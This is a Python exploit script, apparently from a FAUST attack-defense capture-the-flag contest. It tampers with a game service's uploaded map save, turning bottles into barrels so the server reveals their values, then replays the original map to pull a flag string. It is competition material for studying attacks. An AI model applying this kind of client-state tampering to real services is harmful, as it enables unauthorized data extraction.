#!/bin/python

import sys
import json
import base64
import socket
import re
import copy

# self written
import binreader
from util import *

flag_format = "(FAUST_[^ ]{32})"

ip = sys.argv[1]
port = int(sys.argv[2])
map_name = sys.argv[3]

def main():
	"""
	STEP 1
	Play and download game
	"""
	sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
	sock.connect((ip, port, 0, 0))

	# initial connect
	val = communicate(sock, {"type": "HELO", "cmd": "new", "map": map_name})
	# get the map
	b64blob = communicate(sock, {"type": "SAVE"})
	binblob = base64.b64decode(b64blob)
	mapjson = binreader.map2json(None, binblob)
	mapjsoncopy = copy.deepcopy(mapjson)
	"""
	STEP 2
	Analyse the map
	Find the bottles and convert them to barrels (interacting with barrels prints their value)
	"""
	room = None
	rname = None
	bottles = []
	for rname in mapjson["rooms"]:
		r = mapjson["rooms"][rname]
		if not r["saveable"]: # cannot start here anyway
			continue
		bottle = None
		for uuid, el in r["elements"].items():
			if el["id"] == 5: # found a bottle
				el["id"] = 4 # change to barrel
				bottles += [el]
		if len(bottles) == 0: # no bottles, don't care
			continue
		room = r
		break # take the first matching room

	if not room:
		print("No saveable room with bottles found")
		sys.exit(1)

	mapjson["globals"]["room"] = rname
	mapjson["globals"]["posx"] = 2
	mapjson["globals"]["posy"] = 2

	"""
	STEP 3
	Upload the custom map
	Play and interact with all bottles (treated as barrels by the server)
	"""
	# Compares two tuples (percent, volume, bottle) ascending. custom function just because dict compare is not availabe
	def compare(a, b):
		if a[0] != b[0]:
			return a[0] < b[0]
		if a[1] != b[1]:
			return a[1] < b[1]
		return False

	play_map = base64.b64encode(json.dumps(mapjson).encode()).decode()
	val = communicate(sock, {"type": "HELO", "cmd": "load", "map": play_map})
	bvalues = []
	for b in bottles:
		bv = communicate(sock, {"type": "INAK", "pos": [b["x"], b["y"]]})
		a = bv.split("|")
		bvalues += [(int(a[1][:-1]), a[0], b)]
	bvalues.sort(key=lambda x : (x[0], x[1]))

	"""
	STEP 4
	Use the original map (just jump to the target room)
	Drink all bottles in increasing percentage order
	"""
	mapjson = mapjsoncopy
	mapjson["globals"]["room"] = rname
	mapjson["globals"]["posx"] = 2
	mapjson["globals"]["posy"] = 2
	play_map = base64.b64encode(json.dumps(mapjson).encode()).decode()
	val = communicate(sock, {"type": "HELO", "cmd": "load", "map": play_map})
	for b in bvalues:
		val = communicate(sock, {"type": "INAK", "pos": [b[2]["x"], b[2]["y"]]})
		r = re.search(flag_format, val)
		if r:
			print(">>", r.group(0))
			break
	else:
		print("NO FLAG FOUND")

	#m = re.search(flag_format, dream)
	#if not m:
	#	print("NO FLAG FOUND", dream)
	#else:
	#	print(">>", m.group(1))

	send_json(sock, {"type": "GBYE"}) # end communication. no answer expected
	sock.close()

if __name__ == "__main__":
	main()
